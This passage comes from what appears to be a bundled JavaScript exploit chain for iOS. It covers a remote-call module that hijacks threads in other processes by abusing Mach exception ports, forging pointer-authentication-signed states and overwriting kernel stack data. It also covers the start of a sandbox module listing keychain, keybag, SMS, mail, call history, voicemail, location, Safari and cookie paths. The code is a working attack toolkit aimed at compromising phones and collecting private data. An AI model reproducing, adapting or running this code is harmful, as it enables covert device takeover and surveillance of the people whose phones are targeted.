				__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
				__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
			state.opaque_lr = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, lr, discLR);
		}
		return state;
	}
	
	#setExceptionPortOnThread(exceptionPort, currThread, migFilterBypass=null)
	{
		let success = false;
		
		let thread_set_exception_ports_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("thread_set_exception_ports");
		let pthread_exit_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("pthread_exit");

		//console.log(TAG, "pc:          " + Utils.hex(thread_set_exception_ports_addr));
		//console.log(TAG, "pc signed:   " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"))));
		//console.log(TAG, "pc signed 0: " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, 0)));

		//let stackMem = Native.callSymbol("malloc", 0x8000);
		//let thread_set_exception_ports_addr = Native.dlsym("_exit");
		//let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		//let state = new ThreadState(stateBuff);

		//let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);
		
		let pthreadPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pthreadPtr, 0n);
		let createKr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
		let pthread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(pthreadPtr);
		let machThread = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", pthread));
		let machThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(machThread);
		rcLog("setExcPort helper createKr=" + createKr +
			" pthread=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(pthread) +
			" machThread=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(machThread) +
			" machThreadAddr=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(machThreadAddr || 0n) +
			" targetThread=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread));
		if (!pthread || pthread === 0n || !machThread || machThread === 0n) {
			rcLog("setExcPort helper pthread/mach invalid - abort");
			return false;
		}

		if (migFilterBypass)
			migFilterBypass.monitorThreads(this.#selfThreadAddr, machThreadAddr);

		let state = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getState(machThread);
		if (!state) {
			rcLog("Unable to read thread state (see [THREAD] kr above)");
			return false;
		}
		rcLog("setExcPort getState OK machThread=" +
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(machThread));

		//console.log(TAG, "thread_get_state OK");

		state.opaque_pc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(thread_set_exception_ports_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("pc"));
		state.opaque_lr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].pacia(pthread_exit_addr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator("lr"));
		//state.opaque_sp = stackMem + 0x4000n;
		state.registers.set(0, this.#dummyThreadMach);
		state.registers.set(1, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_GUARD | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXC_MASK_BAD_ACCESS);
		state.registers.set(2, exceptionPort);
		state.registers.set(3, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES);
		state.registers.set(4, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64);

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
	
		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setState(machThread, machThreadAddr, state)) {
			rcLog("setExcPort setState FAIL");
			return false;
		}
		rcLog("setExcPort setState OK");

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);

		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, this.#selfThreadCtid);
		
		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].resume(machThread)) {
			rcLog("setExcPort resume FAIL");
			return false;
		}
		// old_pe style: 10?200ms kstack scan, then ALWAYS poke exception_ports (even if success=0).
		for (let i = 0; i < 10; i++) {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 200000);

			let kstack = 0x0n;
			kstack = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getStack(machThreadAddr);
			if (!kstack)
			{
				continue;
			}
			let kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE * 12);
			let kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(kstack + kernelSPOffset);
			if (!kernelSP) {
				continue;
			}
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100n);
			let dataBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].readBuff(
				_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + 0x3000n, 0x1000);
			if (!dataBuff) {
				break;
			}

			let buffer = new ArrayBuffer(8);
			const view = new DataView(buffer);
			view.setBigUint64(0, this.#dummyThreadTro, true);
			let found = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].memmem(dataBuff, buffer);
			found = BigInt(found) + 0x3000n;
			let correctTro = false;
			let val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(
				_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + found + 0x18n,
				val, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
			val = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readPtr(val);
			if (val == 0x1002)
				correctTro = true;
			else {
				continue;
			}
			if (found && correctTro)
			{
				if (_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread) == this.#taskAddr)
				{
					let tro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(currThread);
					libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write64(
						_Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(kernelSP) + BigInt(found), tro);
					success = true;
					break;
				}
			}
		}

		// Set LCK_MTX_NEEDS_WAKEUP so that setter would be woken up by the turnstile of the lock on next use.
		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP

		// This will wake up setter (old_pe always does this, success or not)
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, exceptionPort , libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].EXCEPTION_STATE | libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MACH_EXCEPTION_CODES, BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64));

		if (migFilterBypass)
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);

		return success;
	}

	#doRemoteCallTemp(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
		//Calculate actual pc addr
		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			rcLog(`Don't receive first exception on original thread`);
			return 0;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		this._lastLiveSP = exc.threadState.opaque_sp & 0x7fffffffffn;
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojanCreator);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		exc.threadState.registers.set(0,x0);
	
		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			rcLog(`Trojan thread cleanup`);
			return 0;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			rcLog(`Don't receive second exception on original thread`);
			return 0;
		}
		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
	
		return retValue;
	}

	#doRemoteCallStable(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		if (!this.#creatingExtraThread)
			return this.#doRemoteCallTemp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
			
		//Calculate actual pc addr
		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
		if (!pcAddr) {
			rcLog("Unable to find symbol: " + name);
			return 0;
		}
		let newTimeout = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MAX(10000,timeout);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			rcLog(`Don't receive first exception on new thread`);
			return 0;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		this._lastLiveSP = exc.threadState.opaque_sp & 0x7fffffffffn;
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojan);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		exc.threadState.registers.set(0, x0);

		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			rcLog(`Trojan thread cleanup`);
			return 0;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			rcLog(`Don't receive second exception on new thread`);
			return 0;
		}
		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
	
		return retValue;
	}

	call(
		timeout,
		pc,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		//console.log(TAG, `call(${Utils.hex(pc)}, ${Utils.hex(x0)}, ${Utils.hex(x1)}, ${Utils.hex(x2)}, ${Utils.hex(x3)})`);
		return this.#doRemoteCallStable(timeout, pc, x0, x1, x2, x3, x4, x5, x6, x7);
	}

	#restoreTrojanThread(state)
	{
		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, 20000, false))
		{
			rcLog(`Failed to receive first exception while restoring`);
			return false;
		}
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		state.opaque_flags = exc.threadState.opaque_flags;
		state = this.#signState(this.#trojanThreadAddr, state,state.opaque_pc,state.opaque_lr);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, state, false);
		return true;
	}

	destroy()
	{
		try {
			peRcMarkEnd(this.#rcLabel || (this.#pid ? ("pid:" + this.#pid) : "rc"), this.#success ? "ok" : "fail");
		} catch (_) {}
		// Failed ctor: skip remote munmap/exit (10s Don't-receive stalls).
		if (this.#success) {
			try {
				if (this.#trojanMem)
					this.#doRemoteCallStable(100, "munmap", this.#trojanMem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
			} catch (_) {}
			try {
				if (this.#creatingExtraThread)
					this.#doRemoteCallStable(-1, "pthread_exit");
				else if (this.#originalState)
					this.#restoreTrojanThread(this.#originalState);
			} catch (_) {}
		} else {
			rcLog("destroy soft - RC never ready, skip remote munmap/exit");
		}
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, this.#firstExceptionPort, 0n, 0n);
		} catch (_) {}
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203, this.#secondExceptionPort, 0n, 0n);
		} catch (_) {}
		try {
			if (this.#dummyThread)
				libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_cancel", this.#dummyThread);
		} catch (_) {}
	}

	read(src, dst, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		//console.log(TAG, `read(): src=${Utils.hex(src)}, dst=${Utils.hex(dst)}, size=${size}`);
		let until = src + size;
		while (src < until)
		{
			size = until - src;
			let offs = src & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
			let copyCount =  libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(src + 1n) - src, size);
			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(src);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				rcLog("read() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
	
			src += copyCount;
			dst += copyCount;
		}
		return true;
	}

	write(dst, src, size)
	{
		if (!src || !dst || !size)
			return false;

		dst = BigInt(dst);
		src = BigInt(src);
		size = BigInt(size);

		let until = dst + size;

		//console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);
	
		while (dst < until)
		{
			size = until - dst;
			let offs = dst & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
			let copyCount = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(dst + 1n) - dst, size);
			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(dst);
	
			let remotePage = this.#getShmemForPage(pageAddr);
			if (!remotePage) {
				rcLog("write() failed: unable to find remote page");
				return false;
			}
	
			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
	
			dst += copyCount;
			src += copyCount;
		}
		return true;	
	}

	writeStr(dst, str)
	{
		if (!str)
			return false;
		//return this.write(dst, Native.getCString(str), str.length + 1);
		let mem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("malloc", str.length + 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(mem, str);
		const ret = this.write(dst, mem, str.length + 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("free", mem);
		return ret;
	}

	read64(src)
	{
		if (!this.read(src, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE))
			return false;
		const buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	write64(dst, val)
	{
		const buff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		const view = new DataView(buff);
		view.setBigUint64(0, val, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, buff);
		return this.write(dst, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
	}

	mem()
	{
		return this.#trojanMem;
	}

	lastLiveSP()
	{
		return this._lastLiveSP || 0n;
	}

	pac(address,modifier)
	{
		return _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, address, modifier);
	}

	insertRight(port, right)
	{
		//console.log(TAG, "Insert right: " + Utils.hex(port));

		const MACH_MSG_TYPE_COPY_SEND = 19;

		let msgBuff = new ArrayBuffer(24);
		let msg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](msgBuff);
		msg.msgh_id = 0x4141;
		msg.msgh_remote_port = this.#localPort;
		msg.msgh_local_port = port;
		msg.msgh_size = 24;
		msg.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, right);

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_msg_send", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
			rcLog("insertRight: error while sending message: " + errString);
			return 0;
		}
		
		//TODO receive in remote task
		msg.msgh_size = 0x100;
		msg.msgh_local_port = this.#remotePort;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
		this.write(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, 24);

		ret = this.#doRemoteCallStable(100, "mach_msg_receive", this.#trojanMem);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].readString(errString);
			rcLog("insertRight: error while receiving message: " + errString);
			return 0;
		}

		this.read(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
		let recvBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
		let recvMsg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](recvBuff);
		//console.log(TAG, "Recv msg id: " + Utils.hex(recvMsg.msgh_id));
		//console.log(TAG, "Recv remote port: " + Utils.hex(recvMsg.msgh_remote_port));

		ret = this.#doRemoteCallStable(100, "fileport_makefd", recvMsg.msgh_remote_port);
		if (ret < 0) {
			rcLog("insertRight: error with fileport_makefd");
			return 0;
		}
		//console.log(TAG, "Remote fileport_makefd: " + ret);

		return ret;
	}

	#putShmemInCache(shmem)
	{
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if (!this.#shmemCache[i])
			{
				// TODO encapsulate this inside shmem struct
				let shmemBuff = new ArrayBuffer(0x18);
				this.#shmemCache[i] = new _VMShmem__WEBPACK_IMPORTED_MODULE_10__["default"](shmemBuff);
				this.#shmemCache[i].port = shmem.port;
				this.#shmemCache[i].localAddress = shmem.localAddress;
				this.#shmemCache[i].remoteAddress = shmem.remoteAddress;
				return this.#shmemCache[i];
			}
		}
		return null;
	}

	#getShmemForPage(pageAddr)
	{
		let remotePage = this.#getShmemFromCache(pageAddr);
		if (!remotePage)
		{
			//console.log(TAG, `Page not found in cache: ${Utils.hex(pageAddr)}`);
			let newRemotePage = _VM__WEBPACK_IMPORTED_MODULE_9__["default"].mapRemotePage(this.#vmMap, pageAddr);
			if (!newRemotePage || !newRemotePage.localAddress)
				return false;
			return this.#putShmemInCache(newRemotePage);
		}
		//console.log(TAG, `Page found in cache: ${Utils.hex(pageAddr)}`);
		return remotePage;
	}

	#getShmemFromCache(pageAddr)
	{
		//console.log(TAG,`getShmemFromCache(): pageAddr=${Utils.hex(pageAddr)}`);
		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
		{
			if(this.#shmemCache[i])
				if (this.#shmemCache[i].remoteAddress === pageAddr)
					return this.#shmemCache[i];
		}
		return null;
	}
	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(dst, str);
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("CFStringCreateWithCString", 0n, dst, kCFStringEncodingUTF8);
	}

	#EXC_GUARD_ENCODE_TYPE(code, type)
	{
		code |= ((type & BigInt('0x7')) << 61n);
		return code;
	}

	#EXC_GUARD_ENCODE_FLAVOR(code, flavor)
	{
		code |= ((flavor & BigInt('0x1fffffff')) << 32n);
		return code;
	}
	
	#EXC_GUARD_ENCODE_TARGET(code, target)
	{
		code |= target & BigInt('0xffffffff');
		return code;
	}
}

function peRcSleepMs(ms) {
	ms = Number(ms);
	if (!Number.isFinite(ms) || ms <= 0) return;
	try {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", BigInt(Math.floor(ms * 1000)));
	} catch (_) {
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", BigInt(Math.max(1, Math.ceil(ms / 1000))));
		} catch (__) {}
	}
}

// Default export: every `new RemoteCall()` retries with PE_RC_RETRY_MS between fails.
// opts.once / secq_once stay one-shot (SEC-Q / CFG-Q own their cooldown).
function RemoteCallWithRetry(param, migFilterBypass, opts) {
	opts = opts || {};
	let once = !!(opts.once || opts.secq_once);
	let tries = once ? 1 : PE_RC_RETRY_MAX;
	let retryMs = Number(opts.retry_ms);
	if (!Number.isFinite(retryMs) || retryMs <= 0) retryMs = PE_RC_FAIL_GAP_MS;
	let label = (typeof param == "string") ? param : ("pid:" + param);
	let last = null;
	for (let i = 1; i <= tries; i++) {
		last = new RemoteCall(param, migFilterBypass, opts);
		if (last && typeof last.success === "function" && last.success())
			return last;
		try { if (last && last.destroy) last.destroy(); } catch (_) {}
		if (i < tries) {
			rcLog("retry wait " + retryMs + "ms after RC fail try=" + i + "/" + tries +
				" target=" + label);
			peRcSleepMs(retryMs);
		}
	}
	return last;
}

/***/ }),

/***/ "./src/libs/TaskRop/Sandbox.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/Sandbox.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Sandbox)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/FileUtils */ "./src/libs/JSUtils/FileUtils.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _RemoteCall__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");


const TAG = "SANDBOX";

class Sandbox {

	static #launchdTask = null;
	static #PathDictionary = {
		// Communications
		"/private/var/mobile/Library/AddressBook/":0,
		"/private/var/mobile/Library/CallHistoryDB/":0,
		"/private/var/mobile/Library/DoNotDisturb/":0,
		"/private/var/mobile/Library/SMS/":0,
		"/private/var/mobile/Library/Calendar/":0,
		"/private/var/mobile/Library/Mail/":0,
		"/private/var/mobile/Library/Voicemail/":0,
		"/var/mobile/Library/Recordings":0,
		
		// Location
		"/private/var/root/Library/Caches/locationd":0,
		"/private/var/root/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/com.apple.routined/":0,
		
		// Browser & Cookies
		"/private/var/mobile/Library/Safari/":0,
		"/private/var/mobile/Library/Cookies/":0,
		"/private/var/mobile/Cookies/":0,
		
		// Credentials & WiFi
		"/private/var/Keychains/":0,
		"/var/Keychains/":0,
		"/private/var/keybags/":0,
		"/var/keybags/":0,
		"/private/var/keybags/systembag.kb":0,
		"/private/var/keybags/persona.kb":0,
		"/private/var/keybags/usersession.kb":0,
		"/private/var/keybags/backup/":0,
		"/var/keybags/":0,
		"/var/keybags/systembag.kb":0,
		"/var/keybags/persona.kb":0,
		"/var/keybags/usersession.kb":0,
		"/var/keybags/backup/":0,
